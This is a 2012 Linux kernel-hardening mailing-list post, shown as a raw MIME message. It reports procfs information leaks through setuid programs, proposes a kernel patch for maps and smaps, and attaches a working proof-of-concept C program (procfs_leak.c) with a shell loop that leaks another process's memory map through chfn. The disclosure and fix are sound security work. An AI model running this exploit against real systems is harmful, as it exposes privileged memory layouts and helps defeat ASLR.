Reply-To: kernel-hardening@lists.openwall.com
Date: Fri, 10 Feb 2012 03:06:58 +0100
From: Djalal Harouni <tixxdz@opendz.org>
Message-ID: <20120210020658.GA17709@dztty>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="WIyZ46R2i8wDzkSu"
Content-Disposition: inline
Subject: [kernel-hardening] procfs: infoleaks and DAC permissions
To: Vasiliy Kulikov <segoon@openwall.com>, Kees Cook <keescook@chromium.org>, kernel-hardening@lists.openwall.com, "Jason A. Donenfeld" <Jason@zx2c4.com>
Cc: Solar Designer <solar@openwall.com>
List-ID: <kernel-hardening.lists.openwall.com>


--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi Vasiliy, Kees, list,

According to this thread 'Linux procfs infoleaks via self-read by a
SUID/SGID program' [1] and to Jason A. Donenfeld there are still some
procfs leaks.

I'm writing to discuss these things here before trying lkml, thanks in
advance.


Actually these infoleaks are not just related to self-read, I believe that
there are some arbitrary /proc/$pid/ info leaks, which can be used to
bypass ASLR, to read kernel threads stack (fingerprint function offsets)...


At least there are two issues for the procfs:

1) Infoleaks via self-read by a suid/guid:
   As noted in the thread [1], this probably affects most of the procfs
   seq files.
   - fd = open(/proc/self/maps...)
   - exec a setuid program
   - fd = /proc/pid_of_setuid/maps
     (due to the 'task_struct' and 'mm_struct' lookup logic).
   - read data from fd, this will pass ptrace_may_access() check.
   - setuid program gives data.

   The attached PoC 'procfs_leak.c' can be used to read 'smaps' of the
   setuid 'chfn', instructions on how to use it can be found at [1].

   I believe to fix this we should just let 'mm_struct' point to the old
   one (as done by Linus' commit [2] for the /proc/self/mem) and check
   the 'mm_struct->mm_users' on each read/lseek/write... to see if that
   mm_struct is still referenced or not. There is a small window when we
   can pass the 'mm_struct->mm_users' check but hopefully the 'mm_struct'
   point to the old one, next one will fail.


2) DAC permissions and suid/guid/privileged programs (userspace):
   This is a list of files that are supposed to be protected:
   /proc/<pid>/maps
   /proc/<pid>/numa_maps
   /proc/<pid>/smaps
   /proc/<pid>/pagemap      Page table
   /proc/<pid>/personality
   /proc/<pid>/stack        Enbled by CONFIG_STACKTRACE
   /proc/<pid>/syscall
   more... ?

Currently these files do not follow DAC. Userspace assumes that if the
open(file, O_RDONLY...) succeed then the read() will also succeed.
However this is not the case with these files.
They are 0444, the open() will succeed but the read() will fail due to the
ptrace_may_access() check. This will break userspace.
 open() => success
 lseek() => fail
 read() => fail

Now if we manage to:
- Find a setuid/privileged program that reads user specified files.
- setuid program drops privileges temporarily.
- setuid program opens user file: '/proc/1/maps' to _get_ the fd.
  open() will succeed
- setuid program restores privileges
- setuid program calls lseek,read... on the previous fd.
- Information leakage...

You can also pass the fd to a privileged program, this will leak these
/proc/<pid>/ files.
The 'chfn' according to config will not ask for a password => we can
read /proc/1/maps ... 

With ordinary files this should fail but these procfs files are special.


A partial fix for this (2):
Procfs 'hidepid=' mount option which can be used to restrict access to
arbitrary /proc/<pid>/ files, Vasiliy commit [3], congrats.
But if the procfs 'gid=' mount option is used then it can give permissions
back to read these files if the user is part of the 'gid' group. IOW this
will just restore the previous vulnerable situation.


These files should just follow DAC and be 0400, I know about glibc
breakage. At least files that do not break glibc should be 0400 and
prevent self-read infoleak.


The attached patch was only tested against 'maps' and 'smaps' and it is
based on Linus' patch [2] for /proc/self/mem. At first I was planning to
avoid the check at the open() since I found from old threads that this can
break glibc "-D_FORTIFY_SOURCE=2 -O2" [3] [4], these days '%n' should be
just banned.

But doing the check in the open() and following DAC seems the right thing,
BTW the patch adds the 'mm_struct' to the 'proc_maps_private', and it is
used to reference the address space, that 'task_struct' should be removed
from the 'proc_maps_private'.

What do you think ?

Thanks.


[1] http://www.openwall.com/lists/oss-security/2012/02/08/2
[2] http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=e268337dfe26dfc7efd422a804dbb27977a3cccc
[3] http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=0499680a42141d86417a8fbaa8c8db806bea1201
[4] http://lkml.org/lkml/2007/3/10/250
[5] http://lkml.org/lkml/2006/1/22/150

-- 
tixxdz
http://opendz.org


From: Djalal Harouni <tixxdz@opendz.org>
Subject: [PATCH] proc: fix maps and smaps infoleak

Signed-off-by: Djalal Harouni <tixxdz@opendz.org>
---
 fs/proc/internal.h |    1 +
 fs/proc/task_mmu.c |   79 ++++++++++++++++++++++++++++++++++++++++-----------
 2 files changed, 63 insertions(+), 17 deletions(-)

diff --git a/fs/proc/internal.h b/fs/proc/internal.h
index 2925775..e56b899 100644
--- a/fs/proc/internal.h
+++ b/fs/proc/internal.h
@@ -64,6 +64,7 @@ extern const struct inode_operations proc_net_inode_operations;
 struct proc_maps_private {
 	struct pid *pid;
 	struct task_struct *task;
+	struct mm_struct *mm;
 #ifdef CONFIG_MMU
 	struct vm_area_struct *tail_vma;
 #endif
diff --git a/fs/proc/task_mmu.c b/fs/proc/task_mmu.c
index 7dcd2a2..e8f8e40 100644
--- a/fs/proc/task_mmu.c
+++ b/fs/proc/task_mmu.c
@@ -103,10 +103,16 @@ static void *m_start(struct seq_file *m, loff_t *pos)
 {
 	struct proc_maps_private *priv = m->private;
 	unsigned long last_addr = m->version;
-	struct mm_struct *mm;
 	struct vm_area_struct *vma, *tail_vma = NULL;
+	struct mm_struct *mm = priv->mm;
 	loff_t l = *pos;
 
+	if (!mm)
+		return NULL;
+
+	if (!atomic_inc_not_zero(&mm->mm_users))
+		return NULL;
+
 	/* Clear the per syscall fields in priv */
 	priv->task = NULL;
 	priv->tail_vma = NULL;
@@ -121,16 +127,9 @@ static void *m_start(struct seq_file *m, loff_t *pos)
 	if (last_addr == -1UL)
 		return NULL;
 
-	priv->task = get_pid_task(priv->pid, PIDTYPE_PID);
-	if (!priv->task)
-		return ERR_PTR(-ESRCH);
-
-	mm = mm_for_maps(priv->task);
-	if (!mm || IS_ERR(mm))
-		return mm;
 	down_read(&mm->mmap_sem);
 
-	tail_vma = get_gate_vma(priv->task->mm);
+	tail_vma = get_gate_vma(mm);
 	priv->tail_vma = tail_vma;
 
 	/* Start with last addr hint */
@@ -193,15 +192,37 @@ static void m_stop(struct seq_file *m, void *v)
 static int do_maps_open(struct inode *inode, struct file *file,
 			const struct seq_operations *ops)
 {
+	struct task_struct *task;
+	struct mm_struct *mm;
 	struct proc_maps_private *priv;
-	int ret = -ENOMEM;
+	int ret = -ESRCH;
+
+	task = get_proc_task(file->f_path.dentry->d_inode);
+	if (!task)
+		return ret;
+
+	mm = mm_for_maps(task);
+	put_task_struct(task);
+
+	if (IS_ERR(mm))
+		return PTR_ERR(mm);
+
+	if (mm) {
+		/* ensure this mm_struct can't be freed */
+		atomic_inc(&mm->mm_count);
+		/* but do not pin its memory */
+		mmput(mm);
+	}
+
+	ret = -ENOMEM;
 	priv = kzalloc(sizeof(*priv), GFP_KERNEL);
 	if (priv) {
-		priv->pid = proc_pid(inode);
 		ret = seq_open(file, ops);
 		if (!ret) {
 			struct seq_file *m = file->private_data;
 			m->private = priv;
+			priv->pid = proc_pid(inode);
+			priv->mm = mm;
 		} else {
 			kfree(priv);
 		}
@@ -209,6 +230,22 @@ static int do_maps_open(struct inode *inode, struct file *file,
 	return ret;
 }
 
+static int do_maps_release(struct inode *inode, struct file *file)
+{
+	int ret = 0;
+	struct seq_file *seq = file->private_data;
+
+	if (seq && seq->private) {
+		struct proc_maps_private *priv = seq->private;
+		if (priv->mm)
+			mmdrop(priv->mm);
+
+		ret = seq_release_private(inode, file);
+	}
+
+	return ret;
+}
+
 static void show_map_vma(struct seq_file *m, struct vm_area_struct *vma)
 {
 	struct mm_struct *mm = vma->vm_mm;
@@ -279,12 +316,11 @@ static int show_map(struct seq_file *m, void *v)
 {
 	struct vm_area_struct *vma = v;
 	struct proc_maps_private *priv = m->private;
-	struct task_struct *task = priv->task;
 
 	show_map_vma(m, vma);
 
 	if (m->count < m->size)  /* vma is copied successfully */
-		m->version = (vma != get_gate_vma(task->mm))
+		m->version = (vma != get_gate_vma(priv->mm))
 			? vma->vm_start : 0;
 	return 0;
 }
@@ -301,11 +337,16 @@ static int maps_open(struct inode *inode, struct file *file)
 	return do_maps_open(inode, file, &proc_pid_maps_op);
 }
 
+static int maps_release(struct inode *inode, struct file *file)
+{
+	return do_maps_release(inode, file);
+}
+
 const struct file_operations proc_maps_operations = {
 	.open		= maps_open,
 	.read		= seq_read,
 	.llseek		= seq_lseek,
-	.release	= seq_release_private,
+	.release	= maps_release,
 };
 
 /*
@@ -425,7 +466,6 @@ static int smaps_pte_range(pmd_t *pmd, unsigned long addr, unsigned long end,
 static int show_smap(struct seq_file *m, void *v)
 {
 	struct proc_maps_private *priv = m->private;
-	struct task_struct *task = priv->task;
 	struct vm_area_struct *vma = v;
 	struct mem_size_stats mss;
 	struct mm_walk smaps_walk = {
@@ -474,7 +514,7 @@ static int show_smap(struct seq_file *m, void *v)
 			(unsigned long)(mss.pss >> (10 + PSS_SHIFT)) : 0);
 
 	if (m->count < m->size)  /* vma is copied successfully */
-		m->version = (vma != get_gate_vma(task->mm))
+		m->version = (vma != get_gate_vma(priv->mm))
 			? vma->vm_start : 0;
 	return 0;
 }
@@ -491,11 +531,16 @@ static int smaps_open(struct inode *inode, struct file *file)
 	return do_maps_open(inode, file, &proc_pid_smaps_op);
 }
 
+static int smaps_release(struct inode *inode, struct file *file)
+{
+	return do_maps_release(inode, file);
+}
+
 const struct file_operations proc_smaps_operations = {
 	.open		= smaps_open,
 	.read		= seq_read,
 	.llseek		= seq_lseek,
-	.release	= seq_release_private,
+	.release	= smaps_release,
 };
 
 static int clear_refs_pte_range(pmd_t *pmd, unsigned long addr,
-- 
1.7.1


--WIyZ46R2i8wDzkSu
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="procfs_leak.c"

/*
* Procfs leak
* Author: Djalal Harouni   tixxdz  opendz.org
* License: GPLv2
* 
* Note:
* Running a setuid program that reads data from a user controled
* fd (open(),dup()...) and prints it to a file/terminal readable by
* the user can lead to information leakage.
*
*
* Can leak arbitrary files if you find your setuid winner or just
* play with /proc/self/ ...
*
*
* To test 'chfn'
* 1) set your user password to (without quotes):
* "Locked:                0 kB"
*
* 2) Run this on x86_64 (we use the 'chfn' for a quick test):
* $ for i in $(seq 460 480); \
*   do ./procfs_leak /usr/bin/chfn /proc/self/smaps $i; \
*   done
*
* If it did not work then just adjust the offset or ... ?
*
* For testing only.
*
* 02-02-2012
*/

#define _LARGEFILE64_SOURCE
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define SYS_lseek       8

/* keep in mind that procfs lseek() checks ptrace_may_access() */
loff_t kernel_lseek(int fd, loff_t offset)
{
	return syscall(SYS_lseek, fd, offset, SEEK_SET);
}

int leak(char *prog, char *file, loff_t offset)
{
	int ret;
	int fd_leak;
	char *argv[] = {prog, NULL};

	ret = -1;
	fd_leak = open(file, O_RDONLY);
	if (fd_leak == -1) {
		perror("open");
		return ret;
	}

	if (dup2(fd_leak, STDIN_FILENO) == -1) {
		perror("dup2");
		return ret;
	}
	
	if (offset > 0) {
		/* Can fail on arbitrary files due to the
		* ptrace_may_access() check */
		if (kernel_lseek(STDIN_FILENO, offset) < 0) {
			perror("lseek");
			return ret;
		}
	}
	
	sleep(1);
	execv(argv[0], argv);
	perror("execv");
	
	return ret;
}

int main(int argc, char **argv)
{
	char *program = NULL;
	char *proc_file = NULL;
	loff_t offset = 0;

	if (argc < 3) {
		printf("%s  <program>  <proc_file>  <offset>\n"
		"    <program>: path of a setuid program.\n"
		"    <proc_file>: file to read.\n"
		"    <offset>: Offset.\n", argv[0]);
		return 0;
	} else if (argc == 4) {
		offset = (loff_t) strtol(argv[3], NULL, 0);
	}

	program = argv[1];
	proc_file = argv[2];

	return leak(program, proc_file, offset);
}

--WIyZ46R2i8wDzkSu--
